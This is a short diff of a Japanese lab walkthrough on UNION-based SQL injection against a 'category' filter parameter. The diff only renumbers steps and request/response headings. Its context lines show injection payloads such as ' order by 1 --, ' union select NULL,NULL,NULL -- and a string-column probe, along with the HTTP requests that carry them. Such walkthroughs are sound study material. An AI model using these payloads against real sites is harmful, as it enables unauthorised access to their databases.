@@ -30,8 +30,9 @@ https://〜/filter?category=
  → SQL 文が壊れていることを示す  
 4 ' order by 1 -- 数を順番に上げていき、カラム数が3であることを推測
 5 ' union select NULL,NULL,NULL -- で3カラムであると確認
+
 <details>
-<summary>3 HTTPリクエスト/レスポンス</summary>
+<summary>4 HTTPリクエスト/レスポンス</summary>
   
 リクエスト
 GET /filter?category=' HTTP/2
@@ -43,7 +44,7 @@ HTTP/2 500 Internal Server Error
 
  
 <details>
-<summary>4 HTTPリクエスト/レスポンス</summary>
+<summary>5 HTTPリクエスト/レスポンス</summary>
   
 リクエスト
 GET /filter?category=Gifts' order by 1 -- HTTP/2
@@ -73,11 +74,11 @@ HTTP/2 500 Internal Server Error
 
 </details>
   
-5 指定されたランダム値である'y9LdLy'をNULLに順に当てはめていき、  
+6 指定されたランダム値である'y9LdLy'をNULLに順に当てはめていき、  
 ' union select NULL,'y9LdLy',NULL -- で2カラム目が文字列を受け取れることを確認
 
 <details>
-<summary>5 HTTPリクエスト/レスポンス</summary>
+<summary>6 HTTPリクエスト/レスポンス</summary>
   
 リクエスト
 GET /filter?category=' OR 1=2 -- HTTP/2
